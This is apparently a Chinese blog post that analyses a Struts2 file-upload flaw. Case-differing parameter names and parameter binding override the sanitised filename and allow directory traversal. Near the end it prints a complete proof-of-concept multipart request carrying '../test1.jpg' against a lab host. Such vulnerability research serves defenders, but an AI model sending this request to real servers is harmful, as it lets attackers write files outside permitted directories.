<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ojLncftjClJxKFMnvaRU8w)

**0x01 前言**
-----------

跟进了下 struts2 的这个文件上传，简单来说就是可以绕过 struts2 自带的文件上传拦截器 (FileUploadInterceptor) 中的文件名的相关校验，达到了可以目录遍历的效果。

具体怎么回事不太好概括，我们一步步来看看。

**0x02** **漏洞分析**
-----------------

Diff![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKynNsTpPXnAhiaAB7NUYxmiaHibXD57DVeuIMSKxOvP5KnS9MDPcf3HpiaQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKfew5EkxzvRcc9ENE2N9WWXGnaHpv7sicm88nb4iaIaNHVAiaMLyO0icWmA/640?wx_fmt=png&from=appmsg)

简单来说更新后使大小写不敏感了。

结合发布的漏洞通告，推测可能是文件上传功能的路径穿越，但是这有跟大小写有啥关系呢，想不明白，写个 Demo 跟踪一下看看吧。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKibEVaZyM3k2q9cRnOypKaYcBM0oJDDD8Iumck8MR1qWXyj0CGOXJJRw/640?wx_fmt=png&from=appmsg)

走个流程，正常情况下在进入 Action 之后../ 就已经被过滤掉了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKYVUciaN7FfmeDycULlMg76Ja94cfFjZaFEk0cxo95N0DENcKvemCthw/640?wx_fmt=png&from=appmsg)

既然如此，那我们给文件上传功能的拦截器打一个断点调试看看是啥时候过滤掉的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKiaNlkxUpW4nDQFzicQeqreXLUec54QeSyGMuSazVT1dRLfgneuNzmurA/640?wx_fmt=png&from=appmsg)

发现获取文件名是通过 multiWrapper.getFileNames 来的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKUKVCiagcnhIgaDHrNSHg8tIDB9xKGiaViacQibrUv2YJibHP2iciaep0ASovA/640?wx_fmt=png&from=appmsg)

一路跟进去，发现最终是通过 getCanonicalName 做了过滤的。

那既然已经做了过滤，一眼看去也没啥问题怎么还会有目录遍历呢，继续往下看。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKHfpn0B43snhkYt3sQepfAXNxcAabuRA4OA6P9jxgqbwWjOviaKHjicfA/640?wx_fmt=png&from=appmsg)

返回 FileUploadInterceptor 继续跟踪，首先获取 inputName，将获取到的 inputName 添  
加 FileName 字符串，然后封装成了 newParams 集合，最后追加给了 ActionContext 的 parameters 中。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JK64V3QY4SbR5uApdku8MqvgQtIxKAQQyxdQwoZCsGDfU3tlausztS7A/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKmwFemx6Etfw4gg9QKEcq6732zVu4SouwCQ9LCYquM15ibd2micced00w/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKtSxHUAJak7Bvlzg9AHJC9XCE7obQfcXJibO2L6mwfP6QickXuRBRAxsw/640?wx_fmt=png&from=appmsg)

然后这里我们全局搜索追一下，在 FileUploadInterceptor 之前是哪里操作了  
ActionContext.parameters。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKTYStUdJq9HT0Gx1ZkHtXLb9rqdO9HDZVjRfskAbPQblkeNdX0IlKfg/640?wx_fmt=png&from=appmsg)

结合调用栈。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKPWMRqsAyoo2ibkKaEakJhr31uX2howVccD28j9odHdYJjK79HlbtVyA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKVLficD3TkSpbgafSupaDMjwtTc2LXdjyuic10EAXt0SHUKpx2XzMxRgQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKv89quiavLfKAgwb4qFIA4V5ENYIv6bRkgyCUwZ66reh0hnqy486Kdeg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKkwTGK9ibciazcQF9UZJnicnu5qmpbQVYvKAX5yt0aUKmA8JAlicznCiaFYw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKkibLcFe714UcSrncqGKEZDU0Rq56hn4TugTBkOWe2DaAYD8AShTRibOw/640?wx_fmt=png&from=appmsg)

当我发送如下请求。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKhW2bQnajFzlOZNC1HS8doLBibgpI9yqLqdMv7eoricz8kQhSEXdX8FQg/640?wx_fmt=png&from=appmsg)

在 ServiceAction 下断点，这边可以看到，extraContext 的 parameters 中首先获取到了非上传所需参数 uthor 与 test，结合 FileUploadInterceptor 最后应该是五个参数了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKEbghrK3vt1m1tWeEoJIsg2rEmaYO3QD3LnrQnbJXuibwCF83pKcvM6A/640?wx_fmt=png&from=appmsg)

那到这里，想一下是不是还有其他的传参方法能够操作 HttpParameters。

观察调用栈发现执行 FileUploadInterceptor 之后还会调用 ParametersInterceptor，可以想到 xwork 参数绑定，那猜测应该是可以通过参数绑定的形式修改 HttpParameters 里的属性了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKLG0A79Maf0bH2qjgGU8YDibmxRKrwjuTIP5Gy84n9xKxKKAOMKib3lEg/640?wx_fmt=png&from=appmsg)

在 ParametersInterceptor 的 doIntercept 打个断点，到这边可以看到这边确实是五个了。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKHv5w3m7l9cYRubcMVIZVBDnfIV2rO30yBa7ohSEaxnoo4JaA5ia01qg/640?wx_fmt=png&from=appmsg)

然后进入 setParameters 可以看到调用 newStack.setParameter，这个方法会调用相应的 setter 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKwU6HzXwDm5CTmm9QQR6aXXLdzt1ZzAUMZtycrHM8UoN4hDg8LHUqicw/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKkRVBHlOia5OSfFTBhTNJwRkxDic28pnvOxicZApqys6WNnED7toicGJicVg/640?wx_fmt=png&from=appmsg)

那是不是可以通过参数绑定直接覆盖呢，构造如下数据包。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKp1ObOWWOibjcfiaHJwZicl4jzlhCPaEWevfwWNMV9dGkpt5hLcrk3SdBA/640?wx_fmt=png&from=appmsg)

进入 ServiceAction 可以看到获取出了 MyFaceFileName=../test1.jpg。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JK8ib4kXZFqSKRvAdInHCRo5bhroWBa5fURCaib9mH6xPcvOrsLceiasI3g/640?wx_fmt=png&from=appmsg)

随后进入到 FileUploadInterceptor，由于 key 相同，MyFaceFileName 的值是被覆盖为了 111.jpg。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PndnBt3YkOJLH09m1JZam1rm3h95TgpP46ibNdnebK00aibZ1ltzoJObBxLezlQg2u3y54Zm3icTzbQ/640?wx_fmt=png&from=appmsg)

可以看到最后这边 MyFaceFileName 的值是 111.jpg。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PndnBt3YkOJLH09m1JZam1WyegmfacX8yaLH4SI5MAXR5ZhZfNibokTjOHHlAvTnhNtg4yEasuW9Q/640?wx_fmt=png&from=appmsg)

既然如此，联想到补丁修复的 HttpParameters 大小写敏感问题，如果此时通过参数绑定传递 MyFaceFileName，在上传表单名中传递 myFace(inputName+FileName)，此时 HttpParameters 里面是 myFaceFileName 与 MyFaceFileName，这个时候 key 不一样，可以同时存在于 HttpParameters 的。

构造如下请求包：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKJcjDFeicdjAvPh8efkadicXicniaWFKYvFiamR2tDu7x5Nh8WDJicq3EAkJQ/640?wx_fmt=png&from=appmsg)

测试发现，最后获取到了 111.jpg 而不是../test1.jpg。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKDgyAefvEb4WJmc8Jw4WlQwS5WxP4IicIh00egIUkCZ5TAUVLn64RACQ/640?wx_fmt=png&from=appmsg)

发现原因是由于 acceptableParameters 是 TreeMap，顺序问题大写是在前面的，我们要想覆盖，参数绑定应该传入小写 myFaceFileName，表单 filename 位置传大写。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKmGVxicJMqXYUwgnArnZ6kD0YXDJUFXl0LDbzvk1ESMAIKkqCbhmDGGQ/640?wx_fmt=png&from=appmsg)

构造如下数据包：

```
POST /upload.action?myFaceFileName=../test1.jpg HTTP/1.1
Host: 192.168.103.75:8083
Content-Length: 2969
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.103.75:8083
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1g8QtTsJ6IIKRZoo
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.103.75:8083/index.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=CB305D6A313149EFC8F49CF6B973DEC3
Connection: close
------WebKitFormBoundary1g8QtTsJ6IIKRZoo
Content-Disposition: form-data; 
------WebKitFormBoundary1g8QtTsJ6IIKRZoo
Content-Disposition: form-data; 
Content-Type: image/jpeg
1111111111111111111111
------WebKitFormBoundary1g8QtTsJ6IIKRZoo--

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKW1AYm2TjqqiclBCeED33Vd92aaP4dcqibTZ4lhp8vG1pibGnicKAMRSH4Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKn4d8XoXJuW8PpDSK2HvLQPMQkoKFBsrMkTC0xMhqYpn0IiaO6LvgYgw/640?wx_fmt=png&from=appmsg)

恢复执行后可以看到打印的文件名为../test1.jpg，成功穿越到别的目录。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JK2fK1EGliaeHsRzQW4Q9pAvhouqJ2meibxseeiavFFX8rhkMNiaf5MN3pOw/640?wx_fmt=png&from=appmsg)

最后要注意构造的参数要根据实际属性名来，所以不通用要根据实际情况来。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKAZwG1wLASIatCLd4Wqgpm7BicFnWibbhnqWrNWcLdRsKDL5DVckHth5Q/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/9zZrDr2DM8PcJ252JVlINgRQEhDMia5JKf4WIiavHicVo1icD7DLvjUvzjyoibOqpArIhoCw4ialYTXicIXKmfW8iafSqA/640?wx_fmt=png&from=appmsg)

**0x03 小密圈**

最后送你一张优惠券，欢迎加入小密圈，好朋友。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/9zZrDr2DM8NXfXRlxZICIJOxg029AiaDchWibXrXFy2MfkwbACicvic5On5RGf5u1xTDuFCuWzNKfQGzHdIiau2631Q/640?wx_fmt=jpeg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1)